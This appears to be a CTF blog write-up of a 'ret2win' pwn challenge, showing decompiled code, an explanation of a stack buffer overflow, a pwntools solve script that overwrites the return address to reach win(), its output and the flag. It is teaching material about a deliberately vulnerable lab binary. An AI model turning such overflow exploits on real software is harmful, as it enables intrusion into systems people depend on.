---
layout: post
title:  "Pwn Challenges"
date:   2026-05-28 13:58:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /SecLeaf-Q2-CTF-2026-pwn/
---
* TOC
{:toc}

## ret2win

**Category**: pwn

**Description**: A vulnerable SECLEAF access terminal was recovered from a decommissioned internal server. The developers claimed the system was "unbreakable." Can you prove otherwise? Flag Format: `SecLeaf{}`

I get the challenge file:
```shell
file ret2win  
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cc7a6bc9a6ea18f86e867b29b5e18777ee6b6fee, for GNU/Linux 3.2.0, not stripped
```

I put it into ghidra and find 3 important functions. `main`:
```shell
undefined8 main(void)

{
  setbuf(stdout,(char *)0x0);
  vuln();
  return 0;
}
```

`vuln`:
```shell
void vuln(void)

{
  char local_48 [64];
  
  printf("Tell me your name: ");
  fgets(local_48,200,stdin);
  printf("Hello, %s\n",local_48);
  return;
}
```

`win`:
```shell
void win(void)

{
  undefined8 local_28;
  undefined local_20;
  undefined7 uStack_1f;
  undefined uStack_18;
  undefined8 local_17;
  
  local_28 = 0x2e33343019363006;
  local_20 = 0x26;
  uStack_1f = 0x3d210a3d266138;
  uStack_18 = 0x66;
  local_17 = 0x283e366121260a;
  decode(&local_28,0x18,0x55);
  puts("\nAccess Granted!");
  printf("Flag: %s\n",&local_28);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

`vuln()` declares a 64 byte buffer but reads 200 bytes with `fgets()`. The saved return address (which points back to `main`) sits 8 bytes after the buffer (72 bytes in total). By writing 72 bytes of junk followed by the address of `win()`, you can overwrite the return address. When `vuln()` returns, execution jumps to `win()` instead of `main()`. Solve script:
```python
#!/usr/bin/env python3
from pwn import *

exe = './ret2win'
elf = ELF(exe)
win_addr = elf.symbols['win']

# 64 byte buffer + 8 byte saved RBP
offset = 72
payload = b'A' * offset + p64(win_addr)

io = process(exe)
io.sendlineafter(b'Tell me your name: ', payload)
io.recvuntil(b'Flag: ')
flag = io.recvline().strip().decode()
log.success(f'Flag: {flag}')
io.close()
```

Output:
```shell
python3 solve.py  
[*] '/home/user/Desktop/ctf/secleafq2026/ret2win'  
	Arch:       amd64-64-little  
	RELRO:      Partial RELRO  
	Stack:      No canary found  
	NX:         NX unknown - GNU_STACK missing  
	PIE:        No PIE (0x400000)  
	Stack:      Executable  
	RWX:        Has RWX segments  
	Stripped:   No  
[+] Starting local process './ret2win': pid 9989  
[*] Process './ret2win' stopped with exit code 0 (pid 9989)  
[+] Flag: SecLeaf{sm4sh_th3_st4ck}
```

It was also possible to decode the flag statically with the XOR key `55`. Cyberchef recipe:
[cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'55'%7D,'Standard',false)&input=MDYzMDM2MTkzMDM0MzMyZTI2Mzg2MTI2M2QwYTIxM2Q2NjBhMjYyMTYxMzYzZTI4)

`SecLeaf{sm4sh_th3_st4ck}`
